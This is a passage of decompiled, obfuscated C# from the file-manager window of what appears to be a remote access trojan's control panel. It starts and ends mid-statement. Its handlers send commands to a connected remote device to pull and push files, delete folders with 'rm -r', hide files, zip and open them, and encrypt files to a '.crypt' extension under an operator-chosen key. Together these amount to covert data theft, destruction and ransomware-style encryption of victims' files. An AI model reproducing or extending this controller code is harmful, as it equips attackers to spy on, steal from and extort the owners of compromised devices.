								string[] array = this.gclass8_0.string_0.Split(new char[]
								{
									':'
								});
								object[] objects_ = new object[]
								{
									this.object_0,
									string.Concat(new string[]
									{
										Module13.string_28,
										GClass9.string_0,
										Module8.string_4,
										".files",
										GClass9.string_0,
										"method",
										GClass9.string_0,
										Module13.string_40,
										GClass9.string_0,
										"download",
										GClass9.string_1,
										array[0],
										GClass9.string_1,
										array[1],
										GClass9.string_1,
										text,
										GClass9.string_1,
										Module13.string_12,
										GClass9.string_1,
										Module13.string_13,
										"File",
										this.gclass8_0.string_9,
										GClass9.string_1,
										"File",
										this.gclass8_0.string_9
									}),
									Module2.smethod_9().GetBytes("null"),
									this.gclass8_0
								};
								this.gclass8_0.method_2(objects_);
							}
						}
					}
				}
			}
		}

		// Token: 0x06000D02 RID: 3330 RVA: 0x00087278 File Offset: 0x00085478
		private void UploadToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.gclass8_0 != null)
			{
				this.FilesUpload.Title = "Please select Files";
				this.FilesUpload.InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
				this.FilesUpload.Filter = "all Files|*.*";
				this.FilesUpload.FileName = string.Empty;
				this.FilesUpload.Multiselect = true;
				if (this.FilesUpload.ShowDialog() == DialogResult.OK && this.gclass8_0 != null)
				{
					string[] fileNames = this.FilesUpload.FileNames;
					if (fileNames.Length > 0)
					{
						foreach (string fileName in fileNames)
						{
							string[] array2 = this.gclass8_0.string_0.Split(new char[]
							{
								':'
							});
							try
							{
								FileInfo fileInfo = new FileInfo(fileName);
								string text = Conversions.ToString(fileInfo.Length);
								string text2 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(this.DGV0.Tag, "/"), fileInfo.Name));
								string name = fileInfo.Name;
								string fullName = fileInfo.FullName;
								object[] objects_ = new object[]
								{
									this.object_0,
									string.Concat(new string[]
									{
										Module13.string_28,
										GClass9.string_0,
										Module8.string_4,
										".files",
										GClass9.string_0,
										"method",
										GClass9.string_0,
										Module13.string_40,
										GClass9.string_0,
										"upload",
										GClass9.string_1,
										array2[0],
										GClass9.string_1,
										array2[1],
										GClass9.string_1,
										text2,
										GClass9.string_1,
										text,
										GClass9.string_1,
										name,
										GClass9.string_1,
										fullName,
										GClass9.string_1,
										Module13.string_14,
										GClass9.string_1,
										Module13.string_15
									}),
									Module2.smethod_9().GetBytes("null"),
									this.gclass8_0
								};
								this.gclass8_0.method_2(objects_);
							}
							catch (Exception ex)
							{
							}
						}
					}
				}
			}
		}

		// Token: 0x06000D03 RID: 3331 RVA: 0x000874F0 File Offset: 0x000856F0
		private void method_8(object sender, EventArgs e)
		{
			checked
			{
				if (this.DGV0.SelectedRows.Count > 0)
				{
					int num = this.DGV0.SelectedRows.Count - 1;
					for (int i = num; i >= 0; i += -1)
					{
						string left = Conversions.ToString(this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[0].Tag);
						if (Operators.CompareString(left, "1", false) == 0)
						{
							string text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(this.DGV0.Tag, "/"), this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[1].Value));
							string text2 = Conversions.ToString(this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[1].Value);
							object obj;
							if (this.method_26(text2.ToLower()))
							{
								obj = "false";
							}
							else if (this.method_27(text2.ToLower()))
							{
								obj = "true";
							}
							else
							{
								obj = "null";
							}
							if (Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(obj, "null", false))) && this.gclass8_0 != null)
							{
								string[] array = this.gclass8_0.string_0.Split(new char[]
								{
									':'
								});
								object[] objects_ = new object[]
								{
									this.object_0,
									Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(string.Concat(new string[]
									{
										Module13.string_28,
										GClass9.string_0,
										Module8.string_4,
										".files",
										GClass9.string_0,
										"method",
										GClass9.string_0,
										Module13.string_40,
										GClass9.string_0,
										"small",
										GClass9.string_1,
										array[0],
										GClass9.string_1,
										array[1],
										GClass9.string_1,
										text,
										GClass9.string_1
									}), obj), GClass9.string_1), this.string_3), GClass9.string_1), Module13.string_17), "File" + this.gclass8_0.string_9),
									Module2.smethod_9().GetBytes("null"),
									this.gclass8_0
								};
								this.gclass8_0.method_2(objects_);
							}
						}
					}
				}
			}
		}

		// Token: 0x06000D04 RID: 3332 RVA: 0x000877C0 File Offset: 0x000859C0
		private void method_9(object sender, EventArgs e)
		{
			if (this.gclass8_0 != null)
			{
				object[] objects_ = new object[]
				{
					this.object_0,
					string.Concat(new string[]
					{
						Module13.string_28,
						GClass9.string_0,
						Module8.string_4,
						".files",
						GClass9.string_0,
						"method",
						GClass9.string_0,
						Module13.string_6,
						GClass9.string_0,
						"files",
						GClass9.string_1,
						"get0"
					}),
					Module2.smethod_9().GetBytes("null"),
					this.gclass8_0
				};
				this.gclass8_0.method_2(objects_);
			}
		}

		// Token: 0x06000D05 RID: 3333 RVA: 0x00087884 File Offset: 0x00085A84
		private void method_10(object sender, EventArgs e)
		{
			if (this.gclass8_0 != null)
			{
				object[] objects_ = new object[]
				{
					this.object_0,
					string.Concat(new string[]
					{
						Module13.string_28,
						GClass9.string_0,
						Module8.string_4,
						".files",
						GClass9.string_0,
						"method",
						GClass9.string_0,
						Module13.string_6,
						GClass9.string_0,
						"files",
						GClass9.string_1,
						"get1"
					}),
					Module2.smethod_9().GetBytes("null"),
					this.gclass8_0
				};
				this.gclass8_0.method_2(objects_);
			}
		}

		// Token: 0x06000D06 RID: 3334 RVA: 0x00087948 File Offset: 0x00085B48
		private void method_11(object sender, EventArgs e)
		{
			if (this.gclass8_0 != null)
			{
				object[] objects_ = new object[]
				{
					this.object_0,
					string.Concat(new string[]
					{
						Module13.string_28,
						GClass9.string_0,
						Module8.string_4,
						".files",
						GClass9.string_0,
						"method",
						GClass9.string_0,
						Module13.string_6,
						GClass9.string_0,
						"files",
						GClass9.string_1,
						"get2"
					}),
					Module2.smethod_9().GetBytes("null"),
					this.gclass8_0
				};
				this.gclass8_0.method_2(objects_);
			}
		}

		// Token: 0x06000D07 RID: 3335 RVA: 0x00087A0C File Offset: 0x00085C0C
		private void method_12(object sender, EventArgs e)
		{
			if (this.gclass8_0 != null)
			{
				object[] objects_ = new object[]
				{
					this.object_0,
					string.Concat(new string[]
					{
						Module13.string_28,
						GClass9.string_0,
						Module8.string_4,
						".files",
						GClass9.string_0,
						"method",
						GClass9.string_0,
						Module13.string_6,
						GClass9.string_0,
						"files",
						GClass9.string_1,
						"get3"
					}),
					Module2.smethod_9().GetBytes("null"),
					this.gclass8_0
				};
				this.gclass8_0.method_2(objects_);
			}
		}

		// Token: 0x06000D08 RID: 3336 RVA: 0x00087AD0 File Offset: 0x00085CD0
		private void method_13(object sender, EventArgs e)
		{
			inp inp = new inp();
			inp.Text = "Access Path";
			inp.LTitle.Text = "Add path";
			inp.InputText.Text = ((this.DGV0.Tag.ToString().Length == 0) ? "/" : this.DGV0.Tag.ToString());
			inp.StartPosition = FormStartPosition.Manual;
			inp.Location = Module2.smethod_46(this, inp);
			DialogResult dialogResult = inp.ShowDialog(this);
			if (dialogResult == DialogResult.OK)
			{
				if (this.gclass8_0 != null)
				{
					object[] objects_ = new object[]
					{
						this.object_0,
						string.Concat(new string[]
						{
							Module13.string_28,
							GClass9.string_0,
							Module8.string_4,
							".files",
							GClass9.string_0,
							"method",
							GClass9.string_0,
							Module13.string_6,
							GClass9.string_0,
							"files",
							GClass9.string_1,
							inp.InputText.Text
						}),
						Module2.smethod_9().GetBytes("null"),
						this.gclass8_0
					};
					this.gclass8_0.method_2(objects_);
				}
			}
			inp.Close();
		}

		// Token: 0x06000D09 RID: 3337 RVA: 0x00087C20 File Offset: 0x00085E20
		private void FolderDownloadsToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.gclass8_0 != null)
			{
				string text = this.gclass8_0.string_10 + "\\Downloads";
				if (!Directory.Exists(text))
				{
					Directory.CreateDirectory(text);
				}
				Process.Start(text);
			}
		}

		// Token: 0x06000D0A RID: 3338 RVA: 0x00087C68 File Offset: 0x00085E68
		private void DecodeToolStripMenuItem_Click(object sender, EventArgs e)
		{
			checked
			{
				if (this.gclass8_0 != null)
				{
					inp inp = new inp();
					inp.Text = "decryption";
					inp.LTitle.Text = "Add decryption key";
					inp.InputText.Text = MySettingsProperty.Settings.EncryptionKey;
					inp.StartPosition = FormStartPosition.Manual;
					inp.Location = Module2.smethod_46(this, inp);
					DialogResult dialogResult = inp.ShowDialog(this);
					if (dialogResult == DialogResult.OK)
					{
						if (this.gclass8_0 != null && this.DGV0.SelectedRows.Count > 0)
						{
							int num = this.DGV0.SelectedRows.Count - 1;
							for (int i = num; i >= 0; i += -1)
							{
								string left = Conversions.ToString(this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[0].Tag);
								if (Operators.CompareString(left, "1", false) == 0)
								{
									string text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(this.DGV0.Tag, "/"), this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[1].Value));
									string value = ".crypt";
									string text2;
									if (!text.EndsWith(value))
									{
										text2 = text + ".decrypt";
									}
									else
									{
										int length = text.LastIndexOf(value);
										text2 = text.Substring(0, length);
									}
									object[] objects_ = new object[]
									{
										this.object_0,
										string.Concat(new string[]
										{
											Module13.string_28,
											GClass9.string_0,
											Module8.string_4,
											".files",
											GClass9.string_0,
											"method",
											GClass9.string_0,
											Module13.string_40,
											GClass9.string_0,
											"decrypt",
											GClass9.string_1,
											text,
											GClass9.string_1,
											text2,
											GClass9.string_1,
											inp.InputText.Text
										}),
										Module2.smethod_9().GetBytes("null"),
										this.gclass8_0
									};
									this.gclass8_0.method_2(objects_);
								}
							}
						}
					}
					inp.Close();
				}
			}
		}

		// Token: 0x06000D0B RID: 3339 RVA: 0x00087EE4 File Offset: 0x000860E4
		private void EncryptToolStripMenuItem_Click(object sender, EventArgs e)
		{
			checked
			{
				if (this.gclass8_0 != null)
				{
					inp inp = new inp();
					inp.Text = "encryption";
					inp.LTitle.Text = "Add encryption key";
					inp.InputText.Text = MySettingsProperty.Settings.EncryptionKey;
					inp.StartPosition = FormStartPosition.Manual;
					inp.Location = Module2.smethod_46(this, inp);
					DialogResult dialogResult = inp.ShowDialog(this);
					if (dialogResult == DialogResult.OK)
					{
						if (this.gclass8_0 != null && this.DGV0.SelectedRows.Count > 0)
						{
							int num = this.DGV0.SelectedRows.Count - 1;
							for (int i = num; i >= 0; i += -1)
							{
								string left = Conversions.ToString(this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[0].Tag);
								if (Operators.CompareString(left, "1", false) == 0)
								{
									string text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(this.DGV0.Tag, "/"), this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[1].Value));
									object[] objects_ = new object[]
									{
										this.object_0,
										string.Concat(new string[]
										{
											Module13.string_28,
											GClass9.string_0,
											Module8.string_4,
											".files",
											GClass9.string_0,
											"method",
											GClass9.string_0,
											Module13.string_40,
											GClass9.string_0,
											"encrypt",
											GClass9.string_1,
											text,
											GClass9.string_1,
											".crypt",
											GClass9.string_1,
											inp.InputText.Text
										}),
										Module2.smethod_9().GetBytes("null"),
										this.gclass8_0
									};
									this.gclass8_0.method_2(objects_);
									MySettingsProperty.Settings.EncryptionKey = inp.InputText.Text;
									MySettingsProperty.Settings.Save();
								}
							}
						}
					}
					inp.Close();
				}
			}
		}

		// Token: 0x06000D0C RID: 3340 RVA: 0x00088148 File Offset: 0x00086348
		private void DeleteToolStripMenuItem_Click(object sender, EventArgs e)
		{
			checked
			{
				if (this.DGV0.SelectedRows.Count > 0)
				{
					int num = this.DGV0.SelectedRows.Count - 1;
					for (int i = num; i >= 0; i += -1)
					{
						string left = Conversions.ToString(this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[0].Tag);
						string text = "del0";
						string text2 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(this.DGV0.Tag, "/"), this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[1].Value));
						if (Operators.CompareString(left, "0", false) == 0)
						{
							text = "del1";
							string text3 = text2;
							text2 = "rm -r" + Strings.Space(1) + this.method_31(text3);
						}
						if (this.gclass8_0 != null)
						{
							object[] objects_ = new object[]
							{
								this.object_0,
								string.Concat(new string[]
								{
									Module13.string_28,
									GClass9.string_0,
									Module8.string_4,
									".files",
									GClass9.string_0,
									"method",
									GClass9.string_0,
									Module13.string_40,
									GClass9.string_0,
									text,
									GClass9.string_1,
									text2
								}),
								Module2.smethod_9().GetBytes("null"),
								this.gclass8_0
							};
							this.gclass8_0.method_2(objects_);
							if (Operators.CompareString(left, "back", false) != 0)
							{
								this.DGV0.Rows.RemoveAt(this.DGV0.SelectedRows[i].Index);
							}
						}
					}
				}
			}
		}

		// Token: 0x06000D0D RID: 3341 RVA: 0x0008834C File Offset: 0x0008654C
		private void EditToolStripMenuItem_Click(object sender, EventArgs e)
		{
			checked
			{
				if (this.DGV0.SelectedRows.Count > 0)
				{
					int num = this.DGV0.SelectedRows.Count - 1;
					for (int i = num; i >= 0; i += -1)
					{
						string text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(this.DGV0.Tag, "/"), this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[1].Value));
						string left = Conversions.ToString(this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[0].Tag);
						if (Operators.CompareString(left, "1", false) == 0)
						{
							object objectValue = RuntimeHelpers.GetObjectValue(this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[2].Tag);
							if (!Operators.ConditionalCompareObjectLessEqual(objectValue, 512000, false))
							{
								Interaction.MsgBox(string.Format(this.string_2, RuntimeHelpers.GetObjectValue(this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[2].Value), RuntimeHelpers.GetObjectValue(this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[1].Value)), MsgBoxStyle.Critical, Module8.string_5);
							}
							else if (this.gclass8_0 != null)
							{
								object[] objects_ = new object[]
								{
									this.object_0,
									string.Concat(new string[]
									{
										Module13.string_28,
										GClass9.string_0,
										Module8.string_4,
										".files",
										GClass9.string_0,
										"method",
										GClass9.string_0,
										Module13.string_22,
										GClass9.string_0,
										"edit",
										GClass9.string_1,
										text
									}),
									Module2.smethod_9().GetBytes("null"),
									this.gclass8_0
								};
								this.gclass8_0.method_2(objects_);
							}
						}
					}
				}
			}
		}

		// Token: 0x06000D0E RID: 3342 RVA: 0x000885DC File Offset: 0x000867DC
		private void ZipToolStripMenuItem_Click(object sender, EventArgs e)
		{
			checked
			{
				if (this.gclass8_0 != null)
				{
					inp inp = new inp();
					inp.Text = "Zip";
					inp.LTitle.Text = "File Name";
					inp.InputText.Text = "new file.zip";
					inp.StartPosition = FormStartPosition.Manual;
					inp.Location = Module2.smethod_46(this, inp);
					StringBuilder stringBuilder = new StringBuilder();
					DialogResult dialogResult = inp.ShowDialog(this);
					if (dialogResult == DialogResult.OK)
					{
						if (this.gclass8_0 != null && this.DGV0.SelectedRows.Count > 0)
						{
							string text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(this.DGV0.Tag, "/"), inp.InputText.Text));
							int num = this.DGV0.SelectedRows.Count - 1;
							for (int i = num; i >= 0; i += -1)
							{
								string left = Conversions.ToString(this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[0].Tag);
								if (Operators.CompareString(left, "1", false) == 0)
								{
									string str = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(this.DGV0.Tag, "/"), this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[1].Value));
									stringBuilder.Append(str + GClass9.string_2);
								}
							}
							if (stringBuilder.ToString().Length > 0)
							{
								object[] objects_ = new object[]
								{
									this.object_0,
									string.Concat(new string[]
									{
										Module13.string_28,
										GClass9.string_0,
										Module8.string_4,
										".files",
										GClass9.string_0,
										"method",
										GClass9.string_0,
										Module13.string_40,
										GClass9.string_0,
										"zip",
										GClass9.string_1,
										stringBuilder.ToString(),
										GClass9.string_1,
										text
									}),
									Module2.smethod_9().GetBytes("null"),
									this.gclass8_0
								};
								this.gclass8_0.method_2(objects_);
							}
						}
					}
					inp.Close();
				}
			}
		}

		// Token: 0x06000D0F RID: 3343 RVA: 0x00088860 File Offset: 0x00086A60
		private void UnZipToolStripMenuItem_Click(object sender, EventArgs e)
		{
			checked
			{
				if (this.DGV0.SelectedRows.Count > 0)
				{
					int num = this.DGV0.SelectedRows.Count - 1;
					for (int i = num; i >= 0; i += -1)
					{
						string left = Conversions.ToString(this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[0].Tag);
						if (Operators.CompareString(left, "1", false) == 0)
						{
							string text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(this.DGV0.Tag, "/"), this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[1].Value));
							string text2 = Conversions.ToString(Operators.ConcatenateObject(this.DGV0.Tag, "/"));
							if (this.gclass8_0 != null)
							{
								object[] objects_ = new object[]
								{
									this.object_0,
									string.Concat(new string[]
									{
										Module13.string_28,
										GClass9.string_0,
										Module8.string_4,
										".files",
										GClass9.string_0,
										"method",
										GClass9.string_0,
										Module13.string_40,
										GClass9.string_0,
										"unzip",
										GClass9.string_1,
										text,
										GClass9.string_1,
										text2
									}),
									Module2.smethod_9().GetBytes("null"),
									this.gclass8_0
								};
								this.gclass8_0.method_2(objects_);
							}
						}
					}
				}
			}
		}

		// Token: 0x06000D10 RID: 3344 RVA: 0x00088A30 File Offset: 0x00086C30
		private void RenameToolStripMenuItem_Click(object sender, EventArgs e)
		{
			checked
			{
				if (this.gclass8_0 != null && this.DGV0.SelectedRows.Count == 1)
				{
					inp inp = new inp();
					inp.Text = "Rename";
					inp.LTitle.Text = "new Name";
					inp.StartPosition = FormStartPosition.Manual;
					inp.Location = Module2.smethod_46(this, inp);
					int num = this.DGV0.SelectedRows.Count - 1;
					for (int i = num; i >= 0; i += -1)
					{
						inp.InputText.Text = Conversions.ToString(this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[1].Value);
					}
					DialogResult dialogResult = inp.ShowDialog(this);
					if (dialogResult == DialogResult.OK)
					{
						if (this.gclass8_0 != null && this.DGV0.SelectedRows.Count == 1)
						{
							int num2 = this.DGV0.SelectedRows.Count - 1;
							for (int j = num2; j >= 0; j += -1)
							{
								string text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(this.DGV0.Tag, "/"), this.DGV0.Rows[this.DGV0.SelectedRows[j].Index].Cells[1].Value));
								string text2 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(this.DGV0.Tag, "/"), inp.InputText.Text));
								if (Operators.CompareString(text, text2, false) != 0)
								{
									object[] objects_ = new object[]
									{
										this.object_0,
										string.Concat(new string[]
										{
											Module13.string_28,
											GClass9.string_0,
											Module8.string_4,
											".files",
											GClass9.string_0,
											"method",
											GClass9.string_0,
											Module13.string_40,
											GClass9.string_0,
											"rename",
											GClass9.string_1,
											text,
											GClass9.string_1,
											text2
										}),
										Module2.smethod_9().GetBytes("null"),
										this.gclass8_0
									};
									this.gclass8_0.method_2(objects_);
								}
							}
						}
					}
					inp.Close();
				}
			}
		}

		// Token: 0x06000D11 RID: 3345 RVA: 0x00088CBC File Offset: 0x00086EBC
		private void HideToolStripMenuItem_Click(object sender, EventArgs e)
		{
			checked
			{
				if (this.DGV0.SelectedRows.Count > 0)
				{
					int num = this.DGV0.SelectedRows.Count - 1;
					for (int i = num; i >= 0; i += -1)
					{
						if (Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[0].Tag, "back", false))))
						{
							string text = Conversions.ToString(this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[1].Value);
							if (text.Trim()[0] != '.')
							{
								string text2 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(this.DGV0.Tag, "/."), text));
								string text3 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(this.DGV0.Tag, "/"), text));
								if (this.gclass8_0 != null)
								{
									object[] objects_ = new object[]
									{
										this.object_0,
										string.Concat(new string[]
										{
											Module13.string_28,
											GClass9.string_0,
											Module8.string_4,
											".files",
											GClass9.string_0,
											"method",
											GClass9.string_0,
											Module13.string_40,
											GClass9.string_0,
											"rename",
											GClass9.string_1,
											text3,
											GClass9.string_1,
											text2
										}),
										Module2.smethod_9().GetBytes("null"),
										this.gclass8_0
									};
									this.gclass8_0.method_2(objects_);
								}
							}
						}
					}
				}
			}
		}

		// Token: 0x06000D12 RID: 3346 RVA: 0x00088EB4 File Offset: 0x000870B4
		private void ShowToolStripMenuItem_Click(object sender, EventArgs e)
		{
			checked
			{
				if (this.DGV0.SelectedRows.Count > 0)
				{
					int num = this.DGV0.SelectedRows.Count - 1;
					for (int i = num; i >= 0; i += -1)
					{
						if (Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[0].Tag, "back", false))))
						{
							string text = Conversions.ToString(this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[1].Value);
							if (text.Trim()[0] == '.')
							{
								string text2 = null;
								int num2 = text.Length - 1;
								bool flag;
								for (int j = 0; j <= num2; j++)
								{
									if (text.Trim()[j] != '.')
									{
										text2 += Conversions.ToString(text.Trim()[j]);
										flag = true;
									}
									else if (flag)
									{
										text2 += Conversions.ToString(text.Trim()[j]);
									}
								}
								flag = false;
								string text3 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(this.DGV0.Tag, "/"), text2));
								string text4 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(this.DGV0.Tag, "/"), text));
								if (this.gclass8_0 != null)
								{
									object[] objects_ = new object[]
									{
										this.object_0,
										string.Concat(new string[]
										{
											Module13.string_28,
											GClass9.string_0,
											Module8.string_4,
											".files",
											GClass9.string_0,
											"method",
											GClass9.string_0,
											Module13.string_40,
											GClass9.string_0,
											"rename",
											GClass9.string_1,
											text4,
											GClass9.string_1,
											text3
										}),
										Module2.smethod_9().GetBytes("null"),
										this.gclass8_0
									};
									this.gclass8_0.method_2(objects_);
								}
							}
						}
					}
				}
			}
		}

		// Token: 0x06000D13 RID: 3347 RVA: 0x0008911C File Offset: 0x0008731C
		private void AddFilesToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.gclass8_0 != null)
			{
				inp inp = new inp();
				inp.Text = "Add Files";
				inp.LTitle.Text = "New name";
				inp.StartPosition = FormStartPosition.Manual;
				inp.Location = Module2.smethod_46(this, inp);
				inp.BOXX.Visible = true;
				DialogResult dialogResult = inp.ShowDialog(this);
				if (dialogResult == DialogResult.OK)
				{
					if (this.gclass8_0 != null)
					{
						bool @checked = inp.CheckFolder.Checked;
						bool checked2 = inp.CheckHidden.Checked;
						string text = inp.InputText.Text;
						if (checked2)
						{
							text = "." + text;
						}
						string text2 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(this.DGV0.Tag, "/"), text));
						object[] objects_ = new object[]
						{
							this.object_0,
							string.Concat(new string[]
							{
								Module13.string_28,
								GClass9.string_0,
								Module8.string_4,
								".files",
								GClass9.string_0,
								"method",
								GClass9.string_0,
								Module13.string_40,
								GClass9.string_0,
								"create",
								GClass9.string_1,
								text2,
								GClass9.string_1,
								Conversions.ToString(@checked)
							}),
							Module2.smethod_9().GetBytes("null"),
							this.gclass8_0
						};
						this.gclass8_0.method_2(objects_);
					}
				}
				inp.Close();
			}
		}

		// Token: 0x06000D14 RID: 3348 RVA: 0x000892C0 File Offset: 0x000874C0
		private void OpenToolStripMenuItem_Click(object sender, EventArgs e)
		{
			checked
			{
				if (this.DGV0.SelectedRows.Count > 0)
				{
					int num = this.DGV0.SelectedRows.Count - 1;
					for (int i = num; i >= 0; i += -1)
					{
						string left = Conversions.ToString(this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[0].Tag);
						if (Operators.CompareString(left, "1", false) == 0)
						{
							string text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(this.DGV0.Tag, "/"), this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[1].Value));
							if (this.gclass8_0 != null)
							{
								string text2 = "null";
								if (text.Contains(".") & !text.EndsWith("."))
								{
									text2 = text.Substring(text.LastIndexOf(".") + 1);
								}
								object[] objects_ = new object[]
								{
									this.object_0,
									string.Concat(new string[]
									{
										Module13.string_28,
										GClass9.string_0,
										Module8.string_4,
										".files",
										GClass9.string_0,
										"method",
										GClass9.string_0,
										Module13.string_40,
										GClass9.string_0,
										"open",
										GClass9.string_1,
										text,
										GClass9.string_1,
										text2
									}),
									Module2.smethod_9().GetBytes("null"),
									this.gclass8_0
								};
								this.gclass8_0.method_2(objects_);
							}
						}
					}
				}
			}
		}

		// Token: 0x06000D15 RID: 3349 RVA: 0x000894B4 File Offset: 0x000876B4
		private bool method_25(string string_0)
		{
			bool result;
			if (string_0.Contains("."))
			{
				string value = "\"" + string_0.Substring(string_0.LastIndexOf(".")) + "\"";
				result = Module8.string_6.Contains(value);
			}
			else
			{
				result = false;
			}
			return result;
		}

		// Token: 0x06000D16 RID: 3350 RVA: 0x00089508 File Offset: 0x00087708
		private bool method_26(string string_0)
		{
			bool result;
			if (!string_0.Contains("."))
			{
				result = false;
			}
			else
			{
				string value = "\"" + string_0.Substring(string_0.LastIndexOf(".")) + "\"";
				result = Module8.string_7.Contains(value);
			}
			return result;
		}

		// Token: 0x06000D17 RID: 3351 RVA: 0x0008955C File Offset: 0x0008775C
		private bool method_27(string string_0)
		{
			bool result;
			if (string_0.Contains("."))
			{
				string value = "\"" + string_0.Substring(string_0.LastIndexOf(".")) + "\"";
				result = Module8.string_8.Contains(value);
			}
			else
			{
				result = false;
			}
			return result;
		}

		// Token: 0x06000D18 RID: 3352 RVA: 0x000895B0 File Offset: 0x000877B0
		private void TOpacity_Tick(object sender, EventArgs e)
		{
			if (base.Opacity != 1.0)
			{
				base.Opacity += 0.1;
			}
			else
			{
				this.TOpacity.Enabled = false;
			}
		}

		// Token: 0x06000D19 RID: 3353 RVA: 0x000895F8 File Offset: 0x000877F8
		private void DGV0_SelectionChanged(object sender, EventArgs e)
		{
			checked
			{
				if (this.DGV0.SelectedRows.Count == 1)
				{
					int num = this.DGV0.SelectedRows.Count - 1;
					for (int i = num; i >= 0; i += -1)
					{
						string left = Conversions.ToString(this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[0].Tag);
						if (Operators.CompareString(left, "1", false) != 0)
						{
							this.viwimage.Image = null;
						}
						else
						{
							string text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(this.DGV0.Tag, "/"), this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[1].Value));
							bool flag = false;
							this.string_5 = Conversions.ToString(Operators.ConcatenateObject(this.gclass8_0.string_10 + "\\Thumbs", NewLateBinding.LateGet(this.DGV0.Tag, null, "Replace", new object[]
							{
								"/",
								"\\"
							}, null, null, null)));
							if (text.Substring(text.LastIndexOf("/") + 1).EndsWith(".mp4"))
							{
								string text2 = text.Substring(text.LastIndexOf("/") + 1);
								if (this.thumb_chk.Checked && Directory.Exists(this.string_5 + "\\" + text2.Replace(".mp4", "")))
								{
									try
									{
										IEnumerator<string> enumerator = MyProject.Computer.FileSystem.GetFiles(this.string_5 + "\\" + text2.Replace(".mp4", "")).GetEnumerator();
										if (enumerator.MoveNext())
										{
											string file = enumerator.Current;
											FileInfo fileInfo = MyProject.Computer.FileSystem.GetFileInfo(file);
											this.viwimage.Image = Module2.smethod_2(string.Concat(new string[]
											{
												this.string_5,
												"\\",
												text2.Replace(".mp4", ""),
												"\\",
												fileInfo.Name
											}));
											this.viwimage.Visible = true;
											flag = true;
										}
									}
									finally
									{
										IEnumerator<string> enumerator;
										if (enumerator != null)
										{
											enumerator.Dispose();
										}
									}
								}
							}
							if (flag)
							{
								break;
							}
							if (this.thumb_chk.Checked && Directory.Exists(this.string_5) && File.Exists(this.string_5 + "\\" + text.Substring(text.LastIndexOf("/") + 1)))
							{
								this.viwimage.Image = Module2.smethod_2(this.string_5 + "\\" + text.Substring(text.LastIndexOf("/") + 1));
								this.viwimage.Visible = true;
								flag = true;
							}
							if (flag)
							{
								break;
							}
							string text3 = Conversions.ToString(this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[1].Value);
							object obj;
							if (this.method_26(text3.ToLower()))
							{
								obj = "false";
							}
							else if (this.method_27(text3.ToLower()))
							{
								obj = "true";
							}
							else
							{
								obj = "null";
							}
							if (Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(obj, "null", false))) && this.gclass8_0 != null)
							{
								string[] array = this.gclass8_0.string_0.Split(new char[]
								{
									':'
								});
								object[] objects_ = new object[]
								{
									this.object_0,
									Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(string.Concat(new string[]
									{
										Module13.string_28,
										GClass9.string_0,
										Module8.string_4,
										".files",
										GClass9.string_0,
										"method",
										GClass9.string_0,
										Module13.string_40,
										GClass9.string_0,
										"small",
										GClass9.string_1,
										array[0],
										GClass9.string_1,
										array[1],
										GClass9.string_1,
										text,
										GClass9.string_1
